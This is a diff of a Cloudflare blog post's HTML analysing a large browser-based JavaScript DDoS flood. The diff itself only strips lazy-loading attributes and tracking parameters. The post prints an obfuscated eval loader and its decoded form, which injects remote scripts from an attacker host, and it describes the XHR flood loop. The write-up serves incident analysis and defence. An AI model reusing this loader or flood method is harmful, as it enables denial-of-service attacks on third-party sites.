@@ -2,7 +2,7 @@
 	<!--kg-card-begin: markdown-->
 	<p>CloudFlare servers are constantly being targeted by DDoS'es. We see everything from attempted DNS reflection attacks to L7 HTTP floods involving large botnets.</p>
 	<p>Recently an unusual flood caught our attention. A site reliability engineer on call noticed a large number of HTTP requests being issued against one of our customers.</p>
-	<p><img src="https://blog.cloudflare.com/content/images/2015/09/js-attack.png" alt="" loading="lazy"></p>
+	<p><img src="https://blog.cloudflare.com/content/images/2015/09/js-attack.png" alt=""></p>
 	<h3 id="therequest">The request</h3>
 	<p>Here is one of the requests:</p>
 	<pre><code class="language-.txt">POST /js/404.js HTTP/1.1
@@ -24,10 +24,10 @@ id=datadatadasssssssssssssssssssssssssssssssssssssssssssasssssssssssssssssssssss
 	<p>Next, notice the request is a <code>POST</code> and contains an <code>Origin</code> header — it was issued by an Ajax (XHR) cross origin call.</p>
 	<p>Finally, the <code>Referer</code> points to the website which was issuing these queries against our servers. We checked: the URL was correct and the site was reachable.</p>
 	<h3 id="browserbasedfloods">Browser-based floods</h3>
-	<p><img src="https://blog.cloudflare.com/content/images/2015/09/attack.jpg" alt="" loading="lazy"></p>
+	<p><img src="https://blog.cloudflare.com/content/images/2015/09/attack.jpg" alt=""></p>
 	<p>Browser-based L7 floods have been rumored as a theoretical threat for a long time. Read <a href="https://blog.cloudflare.com/an-introduction-to-javascript-based-ddos/">Nick Sullivan's explanation</a> on how they work.</p>
-	<p>One of the early mentions was in 2010, when Lavakumar Kuppan proposed abusing <a href="https://media.blackhat.com/bh-ad-10/Kuppan/Blackhat-AD-2010-Kuppan-Attacking-with-HTML5-wp.pdf?ref=blog.cloudflare.com" target="_blank">browser HTML5 features</a> for DoS. Then <a href="https://media.blackhat.com/us-13/us-13-Grossman-Million-Browser-Botnet.pdf?ref=blog.cloudflare.com" target="_blank">in 2013 Jeremiah Grossman and Matt Johansen</a> suggested web advertisements as a distribution vector for the malicious JavaScript. A paper from this year discussed <a href="http://www.christian-rossow.de/publications/cashcannon-woot2015.pdf?ref=blog.cloudflare.com" target="_blank">a theoretical cost</a> of such an attack.</p>
-	<p>Finally, in April it was reported that the <a href="https://citizenlab.org/wp-content/uploads/2009/10/ChinasGreatCannon.pdf?ref=blog.cloudflare.com" target="_blank">Great Cannon</a> distributing JavaScript with a novel method - by injecting raw TCP segments into passing by connections. And just this week a <a href="https://imgur.com/blog/2015/09/22/imgur-vulnerability-patched/?ref=blog.cloudflare.com" target="_blank">flaw</a> popular image hosting site was used to attack another site.</p>
+	<p>One of the early mentions was in 2010, when Lavakumar Kuppan proposed abusing <a href="https://media.blackhat.com/bh-ad-10/Kuppan/Blackhat-AD-2010-Kuppan-Attacking-with-HTML5-wp.pdf" target="_blank">browser HTML5 features</a> for DoS. Then <a href="https://media.blackhat.com/us-13/us-13-Grossman-Million-Browser-Botnet.pdf" target="_blank">in 2013 Jeremiah Grossman and Matt Johansen</a> suggested web advertisements as a distribution vector for the malicious JavaScript. A paper from this year discussed <a href="http://www.christian-rossow.de/publications/cashcannon-woot2015.pdf" target="_blank">a theoretical cost</a> of such an attack.</p>
+	<p>Finally, in April it was reported that the <a href="https://citizenlab.org/wp-content/uploads/2009/10/ChinasGreatCannon.pdf" target="_blank">Great Cannon</a> distributing JavaScript with a novel method - by injecting raw TCP segments into passing by connections. And just this week a <a href="https://imgur.com/blog/2015/09/22/imgur-vulnerability-patched/" target="_blank">flaw</a> popular image hosting site was used to attack another site.</p>
 	<p>It seems the biggest difficulty is not in creating the JavaScript — it is in effectively distributing it. Since an efficient distribution vector is crucial in issuing large floods, up until now I haven't seen many sizable browser-based floods.</p>
 	<p>This is what made the flood described above interesting — it was pretty large, peaking at over 275,000 HTTP requests per second.</p>
 	<h3 id="theattackpage">The attack page</h3>
@@ -35,7 +35,7 @@ id=datadatadasssssssssssssssssssssssssssssssssssssssssssasssssssssssssssssssssss
 	<p>The web page from the <code>Referer</code> looked like a link farm or an ad aggregator — imagine a couple of dozen blinking and shouting banners centrally on a page, nothing more. For this discussion, let's call this page "the attack site". The page was written in basic HTML and used a couple of simple JavaScript routines. It loaded three small JavaScript files, one of them was called <code>count.js</code>. It contained some not notable <code>document.write</code> statements, followed by 50 new lines and this obfuscated code:</p>
 	<pre><code class="language-.txt">eval(function(p,a,c,k,e,r){e=String;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[0-8]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2.3("&lt;0 4=\\"5://6.anotherattacksite.7/8/1/jquery2.1\\"&gt;&lt;/0&gt;");2.3("&lt;0 4=\\"5://6.anotherattacksite.7/8/1/jquery1.1\\"&gt;&lt;/0&gt;");',[],9,'script|js|document|writeln|src|http|www|com|css'.split('|'),0,{}))
 </code></pre>
-	<p>Pasting it to <a href="http://jsbeautifier.org/?ref=blog.cloudflare.com" target="_blank">Js Beautifier</a> revealed the following:</p>
+	<p>Pasting it to <a href="http://jsbeautifier.org/" target="_blank">Js Beautifier</a> revealed the following:</p>
 	<pre><code class="language-.js">document.writeln("&lt;script src=\"http://www.anotherattacksite.com/css/js/jquery2.js\"&gt;&lt;/script&gt;");
 document.writeln("&lt;script src=\"http://www.anotherattacksite.com/css/js/jquery1.js\"&gt;&lt;/script&gt;");
 </code></pre>
@@ -65,7 +65,7 @@ if(!+[1,]) { //IE下不执行。
 	<p>The malicious script above just launches an XHR in a loop.</p>
 	<p>On a side note it uses a pretty smart method of detecting IE. We were not aware <code>if(!+[1,])</code> can be used to detect Internet Explorer 9 and older.</p>
 	<h3 id="analyzingthelogs">Analyzing the logs</h3>
-	<p><img src="https://blog.cloudflare.com/content/images/2015/09/requests-2.png" alt="" loading="lazy"></p>
+	<p><img src="https://blog.cloudflare.com/content/images/2015/09/requests-2.png" alt=""></p>
 	<p>The chart above shows how the flood ramped up over time, with the peak at about 1400 UTC. During that day we received 4.5 billion requests against the targeted domain, issued by 650 thousand unique IP's.</p>
 	<p>Since the flood was so interesting we wrote a dedicated script and were able to further analyze 17M log lines, about 0.4% of the total requests.</p>
 	<p>The flood was coming from a single country:</p>
